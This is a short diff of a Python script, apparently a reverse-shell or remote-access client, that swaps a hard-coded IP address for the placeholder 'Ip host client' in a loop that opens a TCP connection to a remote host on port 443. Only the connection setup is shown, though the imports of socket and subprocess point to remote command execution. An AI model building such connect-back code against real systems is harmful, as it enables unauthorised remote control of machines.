@@ -7,7 +7,7 @@ import socket,subprocess,sys, pickle
 
 while True:
      print("In attesa di connessione...")
-     RHOST = "151.28.246.222"
+     RHOST = "Ip host client"
      RPORT = 443
      s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
      try:
